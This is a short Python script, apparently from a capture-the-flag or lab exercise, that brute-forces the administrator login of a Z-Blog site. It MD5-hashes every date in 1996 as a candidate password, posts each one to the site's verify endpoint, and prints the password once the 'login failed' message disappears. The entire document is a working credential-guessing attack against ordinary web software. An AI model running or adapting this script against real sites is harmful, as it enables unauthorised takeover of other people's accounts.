import requests
import hashlib

url = "http://zblog.spider.com/zb_system/cmd.php?act=verify"
data = "btnPost=%E7%99%BB%E5%BD%95&username=admin&password={}&savedate=1"
header = {"Content-Type": "application/x-www-form-urlencoded"}
# px={"https": "127.0.0.1:1080"}
for i in range(19960101, 19961231):
    password = hashlib.md5(str(i).encode()).hexdigest()
    # print(i)
    print(password)
    temp_data = data.format(password)
    print(temp_data)
    r = requests.post(url, data=temp_data, headers=header)
    html = r.text
    # print(html)
    info = html.find("登录失败")
    print(info)
    # print(r.text)
    if info == -1:
        print(i)
        print("是密码")
   
